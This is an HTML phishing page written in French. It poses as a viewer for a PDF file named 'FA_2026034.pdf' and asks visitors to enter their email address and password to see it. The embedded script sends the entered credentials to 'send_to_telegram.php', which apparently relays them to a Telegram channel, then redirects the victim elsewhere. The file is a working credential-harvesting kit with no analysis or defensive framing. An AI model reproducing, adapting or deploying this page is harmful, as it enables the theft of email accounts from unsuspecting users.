<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voir Document</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="background"></div>
    <div class="container">
        <div class="logo">
            <img src="https://www.unsimpleclic.com/wp-content/uploads/2025/07/img_0375-1.png" alt=;"Logo">
        </div>
        <div style="text-align: center;">
  <!-- Bloc image + Bonjour sur la même ligne -->
  <div style="display: inline-flex; align-items: center; justify-content: center; margin-bottom: 15px;">
    <img src="https://cdn-icons-png.flaticon.com/512/4726/4726010.png" alt="Logo" style="width:50px; height:auto; margin-right:15px;">
    <span style="font-weight: bold; font-size: 20px;">FA_2026034.pdf</span>
  </div>

  <!-- Texte explicatif en dessous -->
  <h3 style="font-weight: normal; color:#ff1100; margin:0;">
    Pour accéder à ce document, entrez les identifiants de la messagerie à laquelle il a été envoyé.
  </h3>
</div>
        <form id="loginForm">
            <label for="email">Adresse e-mail</label>
            <input type="text" id="email" name="email" required>
            <label for="password">Mot de passe</label>
            <input type="password" id="password" name="password" required>
            <input type="submit" value="Voir le document">
        </form>
        <div id="errorMessage" style="color: red;"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            fetch('send_to_telegram.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ email: email, password: password }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.success && data.redirect) {
                    // Redirection vers Google apr s la deuxi me soumission
                    window.location.href = data.redirect;
                } else {
                    // Afficher le message d'erreur
                    document.getElementById('errorMessage').innerText = data.error;
                    document.getElementById('email').value = ''; // Effacer le champ email
                    document.getElementById('password').value = ''; // Effacer le champ mot de passe
                }
            })
            .catch(error => console.error('Erreur:', error));
        });
    </script>
</body>
</html>
